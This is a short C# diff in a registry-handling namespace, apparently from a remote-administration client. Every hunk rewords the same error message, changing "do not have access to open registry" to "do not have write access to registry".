@@ -55,7 +55,7 @@ namespace xClient.Core.Registry
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -108,7 +108,7 @@ namespace xClient.Core.Registry
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -158,7 +158,7 @@ namespace xClient.Core.Registry
                 //Invalid can not open parent
                 if (parent == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + parentPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + parentPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -212,7 +212,7 @@ namespace xClient.Core.Registry
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -264,7 +264,7 @@ namespace xClient.Core.Registry
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -314,7 +314,7 @@ namespace xClient.Core.Registry
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
 
@@ -365,10 +365,10 @@ namespace xClient.Core.Registry
                 //Invalid can not open key
                 if (key == null)
                 {
-                    errorMsg = "You do not have access to open registry: " + keyPath + ", try running client as administrator";
+                    errorMsg = "You do not have write access to registry: " + keyPath + ", try running client as administrator";
                     return false;
                 }
-
+                
                 //Value does not exist
                 if (!key.ContainsValue(value.Name))
                 {
